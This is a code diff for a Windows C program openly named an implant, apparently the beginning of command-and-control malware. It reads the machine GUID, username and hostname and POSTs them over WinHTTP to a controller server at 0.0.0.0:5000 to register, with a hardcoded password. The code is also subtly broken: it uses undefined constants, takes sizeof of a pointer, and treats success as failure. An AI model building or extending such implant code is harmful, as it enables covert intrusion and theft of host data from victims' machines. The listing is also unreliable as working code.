@@ -16,107 +16,176 @@
 #include <pb_decode.h>
 #include "implant.pb.h"
 
+
+
 LPBYTE *ImplantID;
+
+
+pb_ostream_t ReadyRegisterImplantToSend(uint8_t *buffer, RegisterImplant ri) {
+	// uint8_t buffer[4096];
+        pb_ostream_t stream = pb_ostream_from_buffer(buffer, sizeof(buffer));
+
+        if (!pb_encode(&stream, RegisterImplant_fields, &ri)) {
+                DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
+        }
+
+        printf("Successfully encoded: %llu\n", stream.bytes_written);
+	
+	return stream;
+}
+
+int SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t stream) {
+
+        // Initialize WinHTTP and send the request
+        HINTERNET hSession = WinHttpOpen(L"A Custom User Agent",
+                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                        WINHTTP_NO_PROXY_NAME,
+                        WINHTTP_NO_PROXY_BYPASS, 0);
+
+        LPCWSTR SERVER_NAME = L"0.0.0.0";
+        // SERVER_PORT = 5000;
+        HINTERNET hConnect = WinHttpConnect(hSession,
+                        SERVER_NAME,
+                        5000,
+                        0);
+
+
+        // LPCWSTR POST_VERB = L"POST";
+        // LPCWSTR GET_VERB = L"GET";
+        // LPCWSTR API_PATH = L"/register";
+        // LPCWSTR REQUEST_CSRF_PATH = L"/get_csrf";
+
+        HINTERNET hRequest = WinHttpOpenRequest(hConnect,
+                        VERB,
+                        PATH,
+                        NULL,
+                        WINHTTP_NO_REFERER,
+                        WINHTTP_DEFAULT_ACCEPT_TYPES,
+                        0);
+
+	// Set the Content-Type header
+        WinHttpAddRequestHeaders(hRequest,
+                        L"Content-Type: application/x-protobuf",
+                        -1,
+                        WINHTTP_ADDREQ_FLAG_ADD);
+        // Send the request
+        if (!WinHttpSendRequest(hRequest,
+                                WINHTTP_NO_ADDITIONAL_HEADERS,
+                                0,
+                                buffer,
+                                stream.bytes_written,
+                                stream.bytes_written, 0)) {
+                printf("Failed to send request. Error: %ld\n", GetLastError());
+        }
+        // Receive the response
+        if (WinHttpReceiveResponse(hRequest, NULL)) {
+                DWORD dwSize = 0;
+                DWORD dwDownloaded = 0;
+                LPSTR responseBuffer;
+
+		do {
+                        // Check for available data
+                        dwSize = 0;
+                        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
+                                printf("Error %lu in WinHttpQueryDataAvailable.\n", GetLastError());
+                        }
+
+                        // Allocate space for the data
+                        responseBuffer = (LPSTR)malloc(dwSize + 1);
+
+                        if (!responseBuffer) {
+                                printf("Out of memory\n");
+                                dwSize = 0;
+                        } else {
+                                // Read the data
+                                ZeroMemory(responseBuffer, dwSize + 1);
+                                if (!WinHttpReadData(hRequest,
+							(LPVOID)responseBuffer,
+                                                        dwSize,
+                                                        &dwDownloaded)) {
+                                        printf("Error %lu in WinHttpReadData.\n", GetLastError());
+                                } else {
+                                        printf("Server response: %s\n", responseBuffer);
+                                }
+
+                                // Free the memory allocated to the buffer
+                                free(responseBuffer);
+                        }
+                } while (dwSize > 0);
+        }
+
+        // Clean up
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+
+	return 0;
+}
+
+/**
+void GetCSRFToken() {
+	int status = SentToServer(GET_VERB, CSRF_PATH, buffer, stream);
+}
+**/
+
+// Function to set the ImplantID using the machine's GUID
+void ReadMachineGUID() {
+	DWORD dwSize = 255;
+	ImplantID = malloc(dwSize);
+	LONG res =
+		RegGetValueA(HKEY_LOCAL_MACHINE,
+				"SOFTWARE\\Microsoft\\Cryptography",
+				"MachineGuid",
+				RRF_RT_REG_SZ,
+				NULL,
+				ImplantID,
+				&dwSize);
+	if (res) {
+		DEBUG_PRINTF("Failed to get machine guid\n");
+		exit(1);
+	}
+}
+
+// Function to register Implant with the Server
+int RegisterSelf() {
+	RegisterImplant ri = RegisterImplant_init_zero;
+	
+	ReadMachineGUID();
+	ri.GUID = (char *)ImplantID;
+	
+	DWORD dwSizeUser = MAX_PATH;
+	DWORD dwSizeHostname = MAX_PATH;
+	char username[MAX_PATH];
+	GetUserNameA(username, &dwSizeUser);
+	DEBUG_PRINTF("GetUsernameA = %s", username);
+	
+	char hostname[MAX_PATH];
+	GetComputerNameA(hostname, &dwSizeHostname);
+	DEBUG_PRINTF("GetComputerNameA = %s", username);
+
+	ri.Hostname = hostname;
+	ri.Username = username;
+	ri.Password = "pass";
+
+	uint8_t buffer[4096];
+	pb_ostream_t stream = ReadyRegisterImplantToSend(buffer, ri);
+	int status = SentToServer(POST_VERB, REGISTER_PATH, buffer, stream);
+	return status;
+}
+
 
 int main() {
 	DEBUG_PRINTF("Starting Implant.\n");
 
-	/* This is the buffer where we will store our message. */	
-	RegisterImplant ri = RegisterImplant_init_zero;
+	BOOL RegisterResult = RegisterSelf();
 	
-	uint8_t buffer[4096];
-	pb_ostream_t stream = pb_ostream_from_buffer(buffer, sizeof(buffer));
-	
-	bool status = pb_encode(&stream, RegisterImplant_fields, &ri);
-	if (!status) {
-		printf("Encoding failed: %s\n", PB_GET_ERROR(&stream));
-	} // Adjust size as needed
-	
-	printf("wrote %llu\n", stream.bytes_written);
-	
-	// Initialize WinHTTP and send the request
-	HINTERNET hSession = WinHttpOpen(L"A Custom User Agent",
-			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-			WINHTTP_NO_PROXY_NAME,
-			WINHTTP_NO_PROXY_BYPASS, 0);
-	
-	LPCWSTR SERVER_NAME = L"0.0.0.0";
-	// SERVER_PORT = 5000;
-	HINTERNET hConnect = WinHttpConnect(hSession,
-			SERVER_NAME,
-			5000,
-			0);
-	
-
-	// LPCWSTR POST_VERB = L"POST";
-	LPCWSTR GET_VERB = L"GET";
-	// LPCWSTR API_PATH = L"/register";
-	LPCWSTR REQUEST_CSRF_PATH = L"/get_csrf";
-	
-	HINTERNET hRequest = WinHttpOpenRequest(hConnect,
-			GET_VERB,
-		    	REQUEST_CSRF_PATH,
-		    	NULL,
-		    	WINHTTP_NO_REFERER,
-		    	WINHTTP_DEFAULT_ACCEPT_TYPES,
-		    	0);
-	
-	// Set the Content-Type header
-	WinHttpAddRequestHeaders(hRequest,
-			L"Content-Type: application/x-protobuf",
-			-1,
-			WINHTTP_ADDREQ_FLAG_ADD);
-	// Send the request
-	if (!WinHttpSendRequest(hRequest,
-				WINHTTP_NO_ADDITIONAL_HEADERS,
-				0,
-				buffer,
-				stream.bytes_written,
-				stream.bytes_written, 0)) {
-		printf("Failed to send request. Error: %ld\n", GetLastError());
+	if (!RegisterResult) {
+		DEBUG_PRINTF("Failed to Register with the server!\n");
+		return 1;
 	}
-	// Receive the response
-	if (WinHttpReceiveResponse(hRequest, NULL)) {
-		DWORD dwSize = 0;
-		DWORD dwDownloaded = 0;
-		LPSTR pszOutBuffer;
-		do {
-			// Check for available data
-			dwSize = 0;
-			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
-				printf("Error %lu in WinHttpQueryDataAvailable.\n", GetLastError());
-			}
-
-			// Allocate space for the data
-			pszOutBuffer = (LPSTR)malloc(dwSize + 1);
-			
-			if (!pszOutBuffer) {
-				printf("Out of memory\n");
-				dwSize = 0;
-			} else {
-				// Read the data
-				ZeroMemory(pszOutBuffer, dwSize + 1);
-				if (!WinHttpReadData(hRequest,
-							(LPVOID)pszOutBuffer,
-							dwSize,
-							&dwDownloaded)) {
-					printf("Error %lu in WinHttpReadData.\n", GetLastError());
-				} else {
-					printf("Server response: %s\n", pszOutBuffer);
-				}
-				
-				// Free the memory allocated to the buffer
-				free(pszOutBuffer);
-			}
-		} while (dwSize > 0);
-	}
-	
-	// Clean up
-	WinHttpCloseHandle(hRequest);
-	WinHttpCloseHandle(hConnect);
-	WinHttpCloseHandle(hSession);
+	printf("Successfully registered impalnt with implant!\n");
+	return 0;
 }
-
 
 /**
 //SITUATIONAL AWARENESS
